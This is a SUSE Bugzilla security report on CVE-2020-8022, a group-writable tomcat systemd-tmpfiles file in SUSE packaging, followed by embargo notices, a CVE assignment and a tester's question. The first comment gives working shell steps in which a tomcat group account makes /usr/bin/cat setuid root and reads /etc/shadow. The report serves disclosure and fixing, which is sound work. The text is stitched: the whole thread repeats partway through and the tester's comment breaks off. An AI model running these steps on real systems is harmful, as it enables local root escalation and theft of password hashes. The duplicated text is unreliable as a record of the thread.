| [Description](show_bug.cgi?id=1172405#c0)  Matthias Gerstner   2020-06-02 13:53:39 UTC  ``` This seems to be a SUSE specific security issue in the tomcat packaging. It is about the systemd-tmpfiles configuration file:  -rw-rw-r-- 1 root tomcat 76  2. Jun 15:23 /usr/lib/tmpfiles.d/tomcat.conf  it is packaged with mode 664 and group-ownership for the tomcat group. This allows a compromised tomcat group account to perform a full local root exploit e.g. by doing this on openSUSE Tumbleweed:  ```  # emulate a compromised tomcat group  root # sudo -u tomcat /bin/bash  tomcat $ groups  tomcat   tomcat $ echo "f /usr/bin/cat 4755 root root -" >>/usr/lib/tmpfiles.d/tomcat.conf  tomcat $ exit  # simulate a reboot  root # reboot   # login as tomcat in the rebooted system  tomcat $ ls -lh /usr/bin/cat  -rwsr-xr-x 1 root root 31K 11. Mai 13:54 /usr/bin/cat   tomcat $ cat /etc/shadow  <shadow contents> ```  The issue is present in all currently maintained codestreams i.e.:  - SUSE:SLE-15:Update - SUSE:SLE-15-SP1:GA - SUSE:SLE-12-SP4:Update - SUSE:SLE-12-SP2:Update  To fix this it should suffice to ship /usr/lib/tmpfiles.d/tomcat.conf owned by root:root mode 0640. ``` [Comment 1](show_bug.cgi?id=1172405#c1)  Matthias Gerstner   2020-06-02 13:55:49 UTC  ``` This is an embargoed bug. This means that this information is not public. Please - do not talk to other people about this unless they're involved in fixing the issue - do not submit this into OBS (e.g. fix Leap) until this is public - do not make this bug public - Please be aware that the SUSE:SLE-12-SP5:GA and SUSE:SLE-15-SP2:GA codestreams are available via OBS. This means that you can't submit security fixes for embargoed issues to these GA codestreams under development until they become public. In doubt please talk to us on IRC (#security), RocketChat (#security) or send us a mail. ``` [Comment 2](show_bug.cgi?id=1172405#c2)  Matthias Gerstner   2020-06-02 13:56:19 UTC  ``` Internal CRD: 2020-08-31 or earlier ``` [Comment 3](show_bug.cgi?id=1172405#c3)  Johannes Segitz   2020-06-02 14:05:29 UTC  ``` Please use CVE-2020-8022 for this ``` [Comment 6](show_bug.cgi?id=1172405#c6)  ming li   2020-06-16 02:49:59 UTC  ``` (In reply to Matthias Gerstner from [comment #0](show_bug.cgi?id=1172405#c0)) > This seems to be a SUSE specific security issue in the tomcat packaging.

I'm testing S:M:15315:219841. I just have a curious question. I see that the solution to this problem on <http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html> is to remove the write permission.

| [Description](show_bug.cgi?id=1172405#c0)  Matthias Gerstner   2020-06-02 13:53:39 UTC  ``` This seems to be a SUSE specific security issue in the tomcat packaging. It is about the systemd-tmpfiles configuration file:  -rw-rw-r-- 1 root tomcat 76  2. Jun 15:23 /usr/lib/tmpfiles.d/tomcat.conf  it is packaged with mode 664 and group-ownership for the tomcat group. This allows a compromised tomcat group account to perform a full local root exploit e.g. by doing this on openSUSE Tumbleweed:  ```  # emulate a compromised tomcat group  root # sudo -u tomcat /bin/bash  tomcat $ groups  tomcat   tomcat $ echo "f /usr/bin/cat 4755 root root -" >>/usr/lib/tmpfiles.d/tomcat.conf  tomcat $ exit  # simulate a reboot  root # reboot   # login as tomcat in the rebooted system  tomcat $ ls -lh /usr/bin/cat  -rwsr-xr-x 1 root root 31K 11. Mai 13:54 /usr/bin/cat   tomcat $ cat /etc/shadow  <shadow contents> ```  The issue is present in all currently maintained codestreams i.e.:  - SUSE:SLE-15:Update - SUSE:SLE-15-SP1:GA - SUSE:SLE-12-SP4:Update - SUSE:SLE-12-SP2:Update  To fix this it should suffice to ship /usr/lib/tmpfiles.d/tomcat.conf owned by root:root mode 0640. ``` [Comment 1](show_bug.cgi?id=1172405#c1)  Matthias Gerstner   2020-06-02 13:55:49 UTC  ``` This is an embargoed bug. This means that this information is not public. Please - do not talk to other people about this unless they're involved in fixing the issue - do not submit this into OBS (e.g. fix Leap) until this is public - do not make this bug public - Please be aware that the SUSE:SLE-12-SP5:GA and SUSE:SLE-15-SP2:GA codestreams are available via OBS. This means that you can't submit security fixes for embargoed issues to these GA codestreams under development until they become public. In doubt please talk to us on IRC (#security), RocketChat (#security) or send us a mail. ``` [Comment 2](show_bug.cgi?id=1172405#c2)  Matthias Gerstner   2020-06-02 13:56:19 UTC  ``` Internal CRD: 2020-08-31 or earlier ``` [Comment 3](show_bug.cgi?id=1172405#c3)  Johannes Segitz   2020-06-02 14:05:29 UTC  ``` Please use CVE-2020-8022 for this ``` [Comment 6](show_bug.cgi?id=1172405#c6)  ming li   2020-06-16 02:49:59 UTC  ``` (In reply to Matthias Gerstner from [comment #0](show_bug.cgi?id=1172405#c0)) > This seems to be a SUSE specific security issue in the tomcat packaging.
